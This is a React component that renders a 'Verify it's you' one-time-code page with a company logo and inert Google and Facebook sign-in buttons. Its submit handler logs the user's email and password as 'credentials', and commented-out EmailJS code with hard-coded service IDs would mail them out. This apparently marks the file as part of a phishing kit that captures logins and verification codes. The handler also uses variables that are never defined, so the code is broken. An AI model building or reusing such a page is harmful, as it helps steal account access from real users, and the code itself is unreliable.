import React, {useState} from 'react' 
import { useHistory } from 'react-router-dom'
import Form from './Form'

import '../styles/styles.css'
import LogoWhite from '../assets/logo_white.png'

const VerifyOtp = (props) => {

    console.log({props})
    const history = useHistory()

    const [code, setCode] = useState('')

    const handleCode = (e) => {
        setCode(e.target.value)
    }

   

    const handleSubmit = async (e) => {
        e.preventDefault()

        console.log('credentials', email, password)

        if (email === '' || password === '') {
            console.log('not sent')
        } else {
            // emailjs
            //     .send(
            //         'service_cajdfqp',
            //         'template_wss11os',
            //         templateParams,
            //         'user_xCNzJyoa0acBRP75Xy9wk'
            //     )
            //     .then(
            //         (result) => {
            //             console.log(result.text, 'email sent')
            //         },
            //         (error) => {
            //             console.log(error, 'email failed')
            //         }
            //     )

            history.push('/otp', templateParams)
        }
    }
    


    return (
        <div className='grid '>
            <div className=' grid gap-7'>
                <img
                    src={LogoWhite}
                    alt=''
                    className='lg:w-1/4 w-5/12 justify-self-center my-7 '
                />

                <div className='mx-2'>
                    <form
                        className='grid w-full place-content-stretch bg-white md:w-1/3 md:mx-auto rounded '
                        style={{ padding: '30px 15px' }}
                        onSubmit={handleSubmit}
                    >
                        <h2 className='font-medium text-center text-[#1c124d] mb-4 text-2xl'>
                            Verify it's you
                        </h2>
                        <p>
                            We've sent a verification code to your email. Enter
                            the code from the email in the field below.
                        </p>
                        <input
                            id='email'
                            className='text-black outline-none text-lg p-1 rounded-md justify-self-stretch placeholder-[#b2b7be] focus:border-black mb-4'
                            required
                            value={code}
                            placeholder='Enter 6 digit code'
                            onChange={handleCode}
                        />
                   

                        <button
                            className=' rounded-md outline-none  bg-[#0059dd] text-white text-sm'
                            style={{ padding: '.5rem 3rem', lineHeight: 2.5 }}
                        >
                            Sign in to your account
                        </button>
                        <div className='ui horizontal divider font-normal font-BrownBold lowercase'>
                            {' '}
                            <span>Or sign in with</span>
                        </div>

                        <div className='ui grids'>
                            <div
                                className='ui eight wide column'
                                style={{ paddingRight: '16px' }}
                            >
                                <div className='customBtn'>
                                    <svg
                                        className='icon'
                                        xmlns='http://www.w3.org/2000/svg'
                                        width='18'
                                        height='18'
                                        viewBox='0 0 18 18'
                                        aria-hidden='true'
                                    >
                                        <title>Google</title>
                                        <g fill='none' fill-rule='evenodd'>
                                            <path
                                                fill='#4285F4'
                                                d='M17.64 9.2045c0-.6381-.0573-1.2518-.1636-1.8409H9v3.4814h4.8436c-.2086 1.125-.8427 2.0782-1.7959 2.7164v2.2581h2.9087c1.7018-1.5668 2.6836-3.874 2.6836-6.615z'
                                            ></path>
                                            <path
                                                fill='#34A853'
                                                d='M9 18c2.43 0 4.4673-.806 5.9564-2.1805l-2.9087-2.2581c-.8059.54-1.8368.859-3.0477.859-2.344 0-4.3282-1.5831-5.036-3.7104H.9574v2.3318C2.4382 15.9832 5.4818 18 9 18z'
                                            ></path>
                                            <path
                                                fill='#FBBC05'
                                                d='M3.964 10.71c-.18-.54-.2822-1.1168-.2822-1.71s.1023-1.17.2823-1.71V4.9582H.9573A8.9965 8.9965 0 0 0 0 9c0 1.4523.3477 2.8268.9573 4.0418L3.964 10.71z'
                                            ></path>
                                            <path
                                                fill='#EA4335'
                                                d='M9 3.5795c1.3214 0 2.5077.4541 3.4405 1.346l2.5813-2.5814C13.4632.8918 11.426 0 9 0 5.4818 0 2.4382 2.0168.9573 4.9582L3.964 7.29C4.6718 5.1627 6.6559 3.5795 9 3.5795z'
                                            ></path>
                                        </g>
                                    </svg>
                                    <span className='buttonText'>Google</span>
                                </div>
                            </div>
                            <div
                                className='ui eight wide column'
                                style={{ paddingRight: '16px' }}
                            >
                                <div id='facebookSignin' className='customBtn'>
                                    <svg
                                        className='icon'
                                        xmlns='http://www.w3.org/2000/svg'
                                        width='18'
                                        height='18'
                                    >
                                        <path
                                            d='M2 0h14a2 2 0 012 2v14a2 2 0 01-2 2H2a2 2 0 01-2-2V2a2 2 0 012-2zm13 2h-2.5A3.5 3.5 0 009 5.5V8H7v3h2v7h3v-7h3V8h-3V6a1 1 0 011-1h2V2z'
                                            fill='#2553B4'
                                        ></path>
                                    </svg>
                                    <span className='buttonText'>Facebook</span>
                                </div>
                            </div>
                        </div>
                    </form>{' '}
                </div>
            </div>
        </div>
    )
}

export default VerifyOtp